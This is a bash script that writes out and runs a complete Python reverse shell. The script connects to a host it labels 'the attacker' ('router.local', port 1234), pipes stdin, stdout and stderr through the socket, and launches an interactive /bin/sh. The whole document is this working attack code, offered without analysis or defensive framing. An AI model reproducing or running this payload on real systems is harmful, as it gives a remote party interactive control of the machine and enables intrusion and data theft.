#!/bin/bash

echo "Opening reverse shell..."

python_script=$(cat <<EOF

import socket;
import subprocess;
import os;

'''create a TCP socket'''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

'''connect to the attacker''' 
s.connect(('router.local', 1234));
'''s.connect(('localhost', 1234));'''

'''pipe stdin'''
os.dup2(s.fileno(), 0);

'''pipe stdout'''
os.dup2(s.fileno(), 1);

'''pipe stderr'''
os.dup2(s.fileno(), 2);

'''start interactive shell'''
p = subprocess.call(['/bin/sh', '-i']);

EOF
)

python -c "$python_script"
